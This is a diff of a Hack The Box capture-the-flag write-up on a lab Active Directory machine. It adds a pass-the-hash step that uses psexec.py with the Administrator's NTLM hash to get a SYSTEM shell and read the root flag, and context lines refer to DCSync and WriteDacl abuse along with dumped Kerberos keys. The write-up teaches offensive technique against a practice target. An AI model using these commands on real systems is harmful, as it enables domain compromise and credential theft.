@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: smb netexec rpc rpcclient as-rep roastingattack kerberos preauthentication getnpusers.py bloodhound bloodhound-python nestedgroups exchangewindowspermissions dcsync 
+tags: smb nullsession netexec rpc rpcclient as-rep roastingattack kerberos preauthentication getnpusers.py bloodhound bloodhound-python nestedgroups exchangewindowspermissions dcsync secretsdump.py writedacl psexec.py passthehash 
 ---
 
 <br />
@@ -512,7 +512,7 @@ As shown, we need to upload a file with our Windows system target information.
 
 To collect this information remotely, we will use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py).
 
-The only command that we need to execute is the following:
+We only need to run the following command:
 
 <br />
 
@@ -611,7 +611,7 @@ There are two steps that allow us to escalate from `svc-alfresco` to `Administra
 
 Our user `svc-alfresco` is in the `Service Accounts` group, which is nested inside `Privileged IT Accounts`, and that in turn belongs to `Account Operators`.
 
-Because of this nested group structure, `svc-alfresco` ends up being a member of the `Account Operators` group.
+Due to this nested group structure, `svc-alfresco` inherits membership in the `Account Operators` group.
 
 If we right-click on `"WriteDacl"` -> `"Windows Abuse"`, we'll find a step by step guide to escalate by abusing this privilege:
 
@@ -676,7 +676,7 @@ The command completed successfully.
 
 Now we’ll run the commands seen earlier in the `Windows Abuse` section to exploit the `WriteDacl` privilege on the domain.
 
-But after run this commands, we will upload [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/dev/Recon/PowerView.ps1) to the victim machine, because some of this commands are in `PowerShell` language:
+Before running these commands, we'll upload [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/dev/Recon/PowerView.ps1) to the victim machine, because some of this commands are in `PowerShell` language:
 
 <br />
 
@@ -723,7 +723,7 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Princip
 
 <br />
 
-Finally we only need to run this `secretsdump.py` oneliner to retrieve all the information via a `DSCync Attack`:
+Finally, we only need to run the following `secretsdump.py` oneliner to retrieve all the information via a `DSCync Attack`:
 
 <br />
 
@@ -838,5 +838,48 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
+
+<br />
+
+At this point, we can use `psexec.py` to log in NT AUTHORITY\SYSTEM account via `PassTheHash` technique with the Adminstrator's hash:
+
+<br />
+
+```bash
+❯ psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6" Administrator@10.10.10.161
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file sOYoHUvX.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service cEFA on 10.10.10.161.....
+[*] Starting service cEFA.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+<br />
+
+And retrieve `root.txt` flag:
+
+<br />
+
+```bash
+C:\Users\Administrator\Desktop> type root.txt
+53e69828d30c4f322b77663385xxxxxx
+```
+
+<br />
+
+One more Windows machine pwned!
+
+I hope this writeup helped you understand new concepts around Active Directory exploitation.
+
+Keep hacking!❤️❤️
 
 <br />
